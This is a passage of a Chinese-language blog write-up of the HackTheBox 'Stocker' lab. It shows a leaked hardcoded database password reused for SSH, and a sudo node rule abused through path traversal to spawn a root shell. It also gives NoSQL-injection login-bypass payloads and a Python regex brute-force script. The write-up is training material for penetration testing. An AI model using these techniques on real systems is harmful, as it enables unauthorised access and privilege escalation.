class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">user www-data;</span><br><span class="line">worker_processes auto;</span><br><span class="line">pid &#x2F;run&#x2F;nginx.pid;</span><br><span class="line">include &#x2F;etc&#x2F;nginx&#x2F;modules-enabled&#x2F;*.conf;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">        worker_connections 768;</span><br><span class="line">        # multi_accept on;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Basic Settings</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        sendfile on;</span><br><span class="line">        tcp_nopush on;</span><br><span class="line">        tcp_nodelay on;</span><br><span class="line">        keepalive_timeout 65;</span><br><span class="line">        types_hash_max_size 2048;</span><br><span class="line">        # server_tokens off;</span><br><span class="line"></span><br><span class="line">        # server_names_hash_bucket_size 64;</span><br><span class="line">        # server_name_in_redirect off;</span><br><span class="line"></span><br><span class="line">        include &#x2F;etc&#x2F;nginx&#x2F;mime.types;</span><br><span class="line">        default_type application&#x2F;octet-stream;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # SSL Settings</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE</span><br><span class="line">        ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Logging Settings</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log;</span><br><span class="line">        error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Gzip Settings</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        gzip on;</span><br><span class="line"></span><br><span class="line">        # gzip_vary on;</span><br><span class="line">        # gzip_proxied any;</span><br><span class="line">        # gzip_comp_level 6;</span><br><span class="line">        # gzip_buffers 16 8k;</span><br><span class="line">        # gzip_http_version 1.1;</span><br><span class="line">        # gzip_types text&#x2F;plain text&#x2F;css application&#x2F;json application&#x2F;javascript text&#x2F;xml application&#x2F;xml application&#x2F;xml+rss text&#x2F;javascript;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Virtual Host Configs</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        include &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;*.conf;</span><br><span class="line"></span><br><span class="line">        server &#123;</span><br><span class="line">            listen 80;</span><br><span class="line"></span><br><span class="line">            root &#x2F;var&#x2F;www&#x2F;dev;</span><br><span class="line">            index index.html index.htm index.nginx-debian.html;</span><br><span class="line"></span><br><span class="line">            server_name dev.stocker.htb;</span><br><span class="line"></span><br><span class="line">            location &#x2F; &#123;</span><br><span class="line">                proxy_pass http:&#x2F;&#x2F;127.0.0.1:3000;</span><br><span class="line">                proxy_http_version  1.1;</span><br><span class="line">                proxy_cache_bypass  $http_upgrade;</span><br><span class="line"></span><br><span class="line">                proxy_set_header Upgrade           $http_upgrade;</span><br><span class="line">                proxy_set_header Connection        &quot;upgrade&quot;;</span><br><span class="line">                proxy_set_header Host              $host;</span><br><span class="line">                proxy_set_header X-Real-IP         $remote_addr;</span><br><span class="line">                proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;</span><br><span class="line">                proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">                proxy_set_header X-Forwarded-Host  $host;</span><br><span class="line">                proxy_set_header X-Forwarded-Port  $server_port;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        server &#123;</span><br><span class="line">            listen 80;</span><br><span class="line"></span><br><span class="line">            root &#x2F;var&#x2F;www&#x2F;html;</span><br><span class="line">            index index.html index.htm index.nginx-debian.html;</span><br><span class="line"></span><br><span class="line">            server_name stocker.htb;</span><br><span class="line"></span><br><span class="line">            location &#x2F; &#123;</span><br><span class="line">                    try_files $uri $uri&#x2F; &#x3D;404;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        server &#123;</span><br><span class="line">            listen 80 default;</span><br><span class="line"></span><br><span class="line">            server_name _;</span><br><span class="line"></span><br><span class="line">            location &#x2F; &#123;</span><br><span class="line">                return 301 http:&#x2F;&#x2F;stocker.htb;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>得知虚拟主机<code>dev.stocker.htb</code>文件根目录为<code>/var/www/dev</code></p>
+<p>尝试访问<code>/var/www/dev/index.js</code>, <code>/var/www/dev/app.js</code>, <code>/var/www/dev/main.js</code></p>
+<p>服务主文件路径为<code>/var/www/dev/index.js</code><br />
+内容如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">&quot;mongoose&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> MongoStore = <span class="built_in">require</span>(<span class="string">&quot;connect-mongo&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; generatePDF, formatHTML &#125; = <span class="built_in">require</span>(<span class="string">&quot;./pdf.js&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; randomBytes, createHash &#125; = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Configure loading from dotenv for production</span></span><br><span class="line"><span class="keyword">const</span> dbURI = <span class="string">&quot;mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&amp;w=1&quot;</span>;</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(</span><br><span class="line">  session(&#123;</span><br><span class="line">    secret: randomBytes(<span class="number">32</span>).toString(<span class="string">&quot;hex&quot;</span>),</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">true</span>,</span><br><span class="line">    store: MongoStore.create(&#123;</span><br><span class="line">      mongoUrl: dbURI,</span><br><span class="line">    &#125;),</span><br><span class="line">  &#125;)</span><br><span class="line">);</span><br><span class="line">app.use(<span class="string">&quot;/static&quot;</span>, express.static(__dirname + <span class="string">&quot;/assets&quot;</span>));</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/api/products&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.user) <span class="keyword">return</span> res.json([]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> products = <span class="keyword">await</span> mongoose.model(<span class="string">&quot;Product&quot;</span>).find();</span><br><span class="line">  <span class="keyword">return</span> res.json(products);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.session.user) <span class="keyword">return</span> res.redirect(<span class="string">&quot;/stock&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.sendFile(__dirname + <span class="string">&quot;/templates/login.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/login&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username, password &#125; = req.body;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!username || !password) <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login?error=login-error&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> Implement hashing</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> user = <span class="keyword">await</span> mongoose.model(<span class="string">&quot;User&quot;</span>).findOne(&#123; username, password &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!user) <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login?error=login-error&quot;</span>);</span><br><span class="line"></span><br><span class="line">  req.session.user = user.id;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(req.session);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.redirect(<span class="string">&quot;/stock&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/api/order&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.user) <span class="keyword">return</span> res.json(&#123;&#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!req.body.basket) <span class="keyword">return</span> res.json(&#123; <span class="attr">success</span>: <span class="literal">false</span> &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> order = <span class="keyword">new</span> mongoose.model(<span class="string">&quot;Order&quot;</span>)(&#123;</span><br><span class="line">    items: req.body.basket.map(<span class="function">(<span class="params">item</span>) =&gt;</span> (&#123; <span class="attr">title</span>: item.title, <span class="attr">price</span>: item.price, <span class="attr">amount</span>: item.amount &#125;)),</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">await</span> order.save();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.json(&#123; <span class="attr">success</span>: <span class="literal">true</span>, <span class="attr">orderId</span>: order._id &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/api/po/:id&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> order = <span class="keyword">await</span> mongoose.model(<span class="string">&quot;Order&quot;</span>).findById(req.params.id);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!order) <span class="keyword">return</span> res.sendStatus(<span class="number">404</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> htmlPath = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/pos/<span class="subst">$&#123;req.params.id&#125;</span>.html`</span>;</span><br><span class="line">  <span class="keyword">const</span> filePath = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/pos/<span class="subst">$&#123;req.params.id&#125;</span>.pdf`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fs.existsSync(filePath)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.sendFile(filePath);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.writeFileSync(htmlPath, formatHTML(order));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> generatePDF(req.params.id);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fs.existsSync(filePath)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.sendFile(filePath);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.sendStatus(<span class="number">500</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/stock&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.user) <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login?error=auth-required&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.sendFile(__dirname + <span class="string">&quot;/templates/index.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/logout&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  req.session.user = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(port, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">await</span> mongoose.connect(dbURI);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Setup Mongoose schema</span></span><br><span class="line">  <span class="built_in">require</span>(<span class="string">&quot;./schema.js&quot;</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Example app listening on port <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>得到登入密码<code>IHeardPassphrasesArePrettySecure</code></p>
+<p>尝试用于登入angoose账户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh angoose@10.10.11.196</span><br><span class="line">IHeardPassphrasesArePrettySecure</span><br></pre></td></tr></table></figure>
+<p>登入成功<br />
+查看user.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/angoose/user.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c86f19c14d8ee6120dd3c01461b82764</span><br></pre></td></tr></table></figure>
+<h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">IHeardPassphrasesArePrettySecure</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for angoose on stocker:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User angoose may run the following commands on stocker:</span><br><span class="line">    (ALL) &#x2F;usr&#x2F;bin&#x2F;node &#x2F;usr&#x2F;local&#x2F;scripts&#x2F;*.js</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;require(&quot;child_process&quot;).spawn(&quot;/bin/bash&quot;, [&quot;-p&quot;], &#123;stdio: [0, 1, 2]&#125;)&#x27;</span> &gt; /tmp/BFL.js</span><br><span class="line">sudo /usr/bin/node /usr/<span class="built_in">local</span>/scripts/../../../tmp/BFL.js</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;root.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afd487cd1a8b2f2b99d610424c24f39c</span><br></pre></td></tr></table></figure>
+<hr />
+<blockquote>
+<p>错误思路</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl dev.stocker.htb&#x2F;login --json &#39;&#123;&quot;username&quot;: &#123;&quot;$ne&quot;: &quot;angoose&quot;&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125; &#125;&#39; -v</span><br><span class="line">...</span><br><span class="line">Location: &#x2F;login?error&#x3D;login-error</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl dev.stocker.htb&#x2F;login --json &#39;&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;angoose&quot;&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125; &#125;&#39; -v</span><br><span class="line">...</span><br><span class="line">Location: &#x2F;stock</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">req &#x3D; requests.session()</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;dev.stocker.htb&#x2F;login&quot;</span><br><span class="line">password &#x3D; &quot;&quot;</span><br><span class="line">dic &#x3D; string.printable</span><br><span class="line">while 1:</span><br><span class="line">	exit &#x3D; 1</span><br><span class="line">	for _ in dic:</span><br><span class="line">		json &#x3D; &#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;angoose&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^%s&quot; % (password + _)&#125; &#125;</span><br><span class="line">		print(json)</span><br><span class="line">		res &#x3D; req.post(url, json &#x3D; json, allow_redirects &#x3D; False)</span><br><span class="line">		if res.headers[&quot;Location&quot;] &#x3D;&#x3D; &quot;&#x2F;stock&quot;:</span><br><span class="line">			password &#x3D; password + _</span><br><span class="line">			print(password)</span><br><span class="line">			exit &#x3D; 0</span><br><span class="line">			break</span><br><span class="line">	if exit &#x3D;&#x3D; 1:</span><br><span class="line">		exit()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b3e795719e2a644f69838a593dd159ac</span><br></pre></td></tr></table></figure>
+<p>rockyou.txt没跑出来</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>xXxYOLOxXx
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://yoloyolo.top/2023/03/07/HackTheBox-Stocker/" title="HackTheBox_Stocker">https://yoloyolo.top/2023/03/07/HackTheBox-Stocker/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pentest/" rel="tag"># Pentest</a>
+              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/05/HackTheBox-Soccer/" rel="prev" title="HackTheBox_Soccer">
+      <i class="fa fa-chevron-left"></i> HackTheBox_Soccer
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#hackthebox_stocker"><span class="nav-number">1.</span> <span class="nav-text"> HackTheBox_Stocker</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text"> 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.1.2.</span> <span class="nav-text"> 路径枚举</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vhost"><span class="nav-number">1.1.3.</span> <span class="nav-text"> VHOST</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.3.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">xXxYOLOxXx</p>
+  <div class="site-description" itemprop="description">Explorer for unknown.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">54</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">51</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/monster414" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;monster414" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yolo-yolo@qq.com" title="E-Mail → mailto:yolo-yolo@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://music.163.com/#/user/home?id=302397927" title="CloudMisuc → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;302397927" rel="noopener" target="_blank"><i class=" fa-fw"></i>CloudMisuc</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://steamcommunity.com/id/Purple_Miracle/" title="Steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;id&#x2F;Purple_Miracle&#x2F;" rel="noopener" target="_blank"><i class=" fa-fw"></i>Steam</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://yoloyolo.top/atom.xml" title="RSS → https:&#x2F;&#x2F;yoloyolo.top&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xXxYOLOxXx</span>
+</div>
